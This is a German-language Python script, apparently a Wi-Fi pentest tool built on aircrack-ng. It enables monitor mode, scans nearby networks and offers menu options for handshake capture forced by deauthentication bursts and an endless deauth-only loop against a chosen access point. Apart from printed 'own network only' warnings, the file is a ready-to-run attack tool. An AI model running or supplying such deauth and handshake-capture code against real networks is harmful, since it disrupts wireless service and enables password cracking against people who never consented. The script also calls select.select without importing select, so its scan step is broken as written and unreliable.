#!/usr/bin/env python3
import subprocess
import os
import time
import glob
import shutil
import sys
import re
import threading
from datetime import datetime

# ====================== KONFIG ======================
SCAN_DURATION = 20
DEAUTH_BURSTS = 6
DEAUTH_PACKETS = 10
LOGFILE = "wifi_pentest_log.txt"
# ===================================================

def run_cmd(cmd, shell=False, check=False):
    """Verbesserte run_cmd mit optionalem check-Parameter"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=40,
            check=check
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        if not check:
            log(f"WARNING: Befehl '{cmd}' lieferte Rückgabecode {e.returncode}")
            return (e.stdout + (e.stderr or "")).strip()
        else:
            log(f"FEHLER: Befehl fehlgeschlagen: {cmd} | RC={e.returncode}")
            print(f"FEHLER: {cmd} ist fehlgeschlagen (siehe Log).")
            raise
    except Exception as e:
        log(f"UNERWARTETER FEHLER bei {cmd}: {e}")
        print(f"UNERWARTETER FEHLER bei Befehl: {e}")
        return ""

def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass
    print(f"[LOG] {message}")

def is_root():
    if os.geteuid() != 0:
        print("FEHLER: Das Skript muss mit sudo ausgeführt werden!")
        print("   sudo python3 wifi_pentest_tool.py")
        sys.exit(1)

def check_required_tools():
    print("--- Prüfe benötigte Tools...")
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "iw", "iwconfig"]
    missing = [t for t in tools if not shutil.which(t)]
    if missing:
        print("FEHLER: Fehlende Tools:", ", ".join(missing))
        print("Installiere mit: sudo apt update && sudo apt install aircrack-ng iw -y")
        log("Tools fehlen")
        sys.exit(1)
    print("Alle Tools vorhanden.")
    log("Tools-Prüfung OK")

def kill_interfering_processes():
    print("--- Beende störende Prozesse...")
    try:
        run_cmd(["airmon-ng", "check", "kill"], check=False)
        time.sleep(2)
        log("Störende Prozesse bereinigt")
    except Exception as e:
        log(f"Fehler bei airmon-ng check kill: {e}")

def list_wireless_interfaces():
    interfaces = []
    try:
        output = run_cmd(["iw", "dev"])
        for line in output.splitlines():
            if "Interface" in line:
                iface = line.split()[-1].strip()
                if iface:
                    interfaces.append(iface)
    except Exception as e:
        log(f"Fehler bei iw dev: {e}")
    
    if not interfaces:
        output = run_cmd(["iwconfig"])
        for line in output.splitlines():
            if line.strip() and "no wireless extensions" not in line.lower():
                iface = line.split()[0].strip()
                if iface and iface not in interfaces:
                    interfaces.append(iface)
    
    return sorted(list(set(interfaces)))

def select_interface():
    wlans = list_wireless_interfaces()
    if not wlans:
        print("FEHLER: Kein WLAN-Adapter gefunden.")
        log("Kein Adapter gefunden")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("VERFÜGBARE WLAN-ADAPTER:")
    print("="*60)
    for i, iface in enumerate(wlans, 1):
        print(f"{i:2d}. {iface}")
    print("="*60)
    
    while True:
        try:
            choice = int(input("\nWelchen Adapter verwenden? (Nummer): "))
            if 1 <= choice <= len(wlans):
                selected = wlans[choice - 1]
                print(f"→ Ausgewählter Adapter: {selected}")
                log(f"Adapter ausgewählt: {selected}")
                return selected
            else:
                print("Ungültige Nummer!")
        except ValueError:
            print("Bitte nur eine Zahl eingeben!")

def enable_monitor_mode(interface):
    print(f"--- Aktiviere Monitor-Mode auf {interface}...")
    try:
        run_cmd(["airmon-ng", "start", interface], check=True)
        time.sleep(4)
    except Exception as e:
        log(f"FEHLER beim Aktivieren von Monitor-Mode: {e}")
        print("Monitor-Mode konnte nicht aktiviert werden.")
        sys.exit(1)
    
    # Zuverlässige Prüfung, ob Monitor-Interface wirklich existiert
    mon_interface = None
    for attempt in range(15):
        time.sleep(1)
        output = run_cmd(["iwconfig"])
        for line in output.splitlines():
            if "Mode:Monitor" in line:
                mon_interface = line.split()[0].strip()
                if mon_interface:
                    print(f"Monitor-Interface gefunden: {mon_interface}")
                    log(f"Monitor-Interface: {mon_interface}")
                    return mon_interface
    
    # Kein blindes Fallback mehr – stattdessen Fehler
    print("FEHLER: Monitor-Interface konnte nicht erkannt werden.")
    log("Monitor-Interface nicht gefunden")
    print("Überprüfe mit 'iwconfig' und starte das Skript neu.")
    sys.exit(1)

def scan_networks(mon_interface):
    print(f"--- Scanne {SCAN_DURATION} Sekunden... (Enter = sofort anzeigen)")
    prefix = "scan"

    for f in glob.glob(f"{prefix}*"):
        try: os.remove(f)
        except: pass

    try:
        proc = subprocess.Popen(
            ["airodump-ng", mon_interface, "-w", prefix, "--output-format", "csv"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        log(f"FEHLER beim Scan: {e}")
        print("Scan konnte nicht gestartet werden.")
        return []

    csv_file = f"{prefix}-01.csv"
    networks = []
    start_time = time.time()

    try:
        while True:
            # Enter gedrückt?
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                input()
                break

            # Zeit abgelaufen?
            if time.time() - start_time > SCAN_DURATION:
                break

            # CSV auslesen (wenn vorhanden)
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()

                    temp_networks = []
                    in_ap = False

                    for line in lines:
                        line = line.strip()
                        if line.startswith("BSSID,"):
                            in_ap = True
                            continue
                        if in_ap and "Station MAC" in line:
                            break
                        if in_ap and line:
                            fields = [x.strip() for x in line.split(",")]
                            if len(fields) >= 14 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', fields[0]):
                                temp_networks.append({
                                    "bssid": fields[0],
                                    "channel": fields[3],
                                    "essid": fields[13].strip('"') if len(fields) > 13 else "<versteckt>",
                                    "privacy": fields[5],
                                    "power": fields[8]
                                })

                    # sortieren
                    temp_networks.sort(
                        key=lambda x: int(x.get("power", "-100")) if str(x.get("power", "")).lstrip('-').isdigit() else -100,
                        reverse=True
                    )

                    networks = temp_networks

                    # Anzeige (nur SSID + Nummer)
                    os.system("clear")
                    print("GEFUNDENE NETZWERKE:\n")
                    for i, n in enumerate(networks, 1):
                        print(f"{i:2d}. {n['essid']}")

                    print("\n[Enter = sofort auswählen]")

                except:
                    pass

            time.sleep(1)

    finally:
        proc.terminate()

    return networks


def print_networks(networks):
    if not networks:
        return
    print("\nGEFUNDENE NETZWERKE:\n")
    for i, n in enumerate(networks, 1):
        print(f"{i:2d}. {n['essid']}")


def select_network(networks):
    while True:
        try:
            c = int(input("\nNummer des eigenen Netzwerks: "))
            if 1 <= c <= len(networks):
                return networks[c-1]
            print("Ungültige Nummer!")
        except ValueError:
            print("Bitte eine Zahl eingeben!")

def safe_terminate(proc, name="Prozess"):
    """Sauberes Beenden mit terminate → wait → kill"""
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=8)
            log(f"{name} sauber beendet (terminate)")
        except subprocess.TimeoutExpired:
            proc.kill()
            log(f"{name} mit kill beendet")
        except Exception as e:
            log(f"Fehler beim Beenden von {name}: {e}")

def get_capture_file(prefix):
    """Sichere Capture-Datei-Ermittlung"""
    cap_files = glob.glob(f"{prefix}-*.cap")
    if not cap_files:
        print("FEHLER: Keine Capture-Datei erstellt.")
        log(f"Keine .cap-Datei für Prefix {prefix}")
        return None
    cap_file = max(cap_files, key=os.path.getctime)
    print(f"Capture-Datei erstellt: {cap_file}")
    log(f"Capture-Datei: {cap_file}")
    return cap_file

def passive_capture(mon_interface, selected):
    prefix = "passive_capture"
    for f in glob.glob(f"{prefix}*"): 
        try: os.remove(f)
        except: pass
    print(f"\n--- Passives Capture für {selected['essid']}...")
    proc = subprocess.Popen(["airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface])
    input("ENTER zum Beenden...")
    safe_terminate(proc, "airodump-ng")
    return get_capture_file(prefix)

def deauth_handshake(mon_interface, selected):
    print(f"\n--- Starte Capture + Deauth für Handshake ({selected['essid']})")
    print("   Nur auf eigenem Netzwerk verwenden!")
    prefix = "handshake_capture"
    for f in glob.glob(f"{prefix}*"): 
        try: os.remove(f)
        except: pass
    
    airodump = subprocess.Popen([
        "airodump-ng", "-c", selected["channel"], "--bssid", selected["bssid"], "-w", prefix, mon_interface
    ])
    
    def deauth_loop():
        for i in range(DEAUTH_BURSTS):
            print(f"   Deauth-Burst {i+1}/{DEAUTH_BURSTS}...")
            try:
                subprocess.run(["aireplay-ng", "-0", str(DEAUTH_PACKETS), "-a", selected["bssid"], mon_interface],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            except Exception as e:
                log(f"Fehler in Deauth-Burst: {e}")
            time.sleep(3)
    
    threading.Thread(target=deauth_loop, daemon=True).start()
    
    print("Warte auf WPA handshake...")
    input("ENTER zum Beenden...")
    
    safe_terminate(airodump, "airodump-ng")
    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return get_capture_file(prefix)

def general_monitoring(mon_interface):
    print("\n--- Allgemeines Monitoring (ENTER zum Stoppen)...")
    proc = subprocess.Popen(["airodump-ng", mon_interface])
    input()
    safe_terminate(proc, "airodump-ng")

def only_deauth(mon_interface, selected):
    print("--- Nur Deauth-Angriff (ENTER zum Stoppen)...")
    def deauth_loop():
        while True:
            try:
                subprocess.run(["aireplay-ng", "-0", "8", "-a", selected["bssid"], mon_interface],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(2)
    t = threading.Thread(target=deauth_loop, daemon=True)
    t.start()
    input()
    subprocess.run(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def restore(interface, mon_interface):
    print("\n--- System wird wiederhergestellt...")
    try:
        run_cmd(["airmon-ng", "stop", mon_interface], check=False)
        time.sleep(2)
        run_cmd(["ip", "link", "set", interface, "down"], check=False)
        run_cmd(["iwconfig", interface, "mode", "managed"], check=False)
        run_cmd(["ip", "link", "set", interface, "up"], check=False)
        run_cmd(["systemctl", "restart", "NetworkManager"], check=False)
        log("System-Restore durchgeführt")
        print("Restore abgeschlossen.")
    except Exception as e:
        log(f"Restore-Fehler: {e}")
        print("Restore teilweise fehlgeschlagen – prüfe manuell mit iwconfig.")

# ====================== HAUPTPROGRAMM ======================
if __name__ == "__main__":
    start_time = datetime.now()
    is_root()
    log("=== WiFi Pentest Tool gestartet ===")
    log(f"Startzeit: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    check_required_tools()
    kill_interfering_processes()
    
    interface = select_interface()
    mon_interface = enable_monitor_mode(interface)
    
    networks = scan_networks(mon_interface)
    if not networks:
        print("Keine Netzwerke gefunden.")
        restore(interface, mon_interface)
        log("Skript beendet: Keine Netzwerke")
        sys.exit(1)
    
    print_networks(networks)
    selected = select_network(networks)
    
    print("\n" + "="*60)
    print("HAUPTMENÜ")
    print("="*60)
    print("1 = Passives Capture")
    print("2 = Allgemeines Monitoring")
    print("3 = Handshake mit Deauth (aktiv)")
    print("4 = Nur Deauth-Angriff")
    print("0 = Beenden")
    
    while True:
        try:
            choice = int(input("\nAuswahl: "))
            if choice in [0,1,2,3,4]:
                break
        except:
            pass
    
    cap_file = None
    if choice == 1:
        cap_file = passive_capture(mon_interface, selected)
    elif choice == 2:
        general_monitoring(mon_interface)
    elif choice == 3:
        cap_file = deauth_handshake(mon_interface, selected)
    elif choice == 4:
        only_deauth(mon_interface, selected)
    elif choice == 0:
        pass
    
    if cap_file:
        print(f"\nFinale Capture-Datei: {cap_file}")
    
    restore(interface, mon_interface)
    log("Skript erfolgreich beendet")
    print("\nTool sauber beendet. Nur auf eigenen Netzwerken verwenden!")
    print(f"Logdatei: {LOGFILE}")
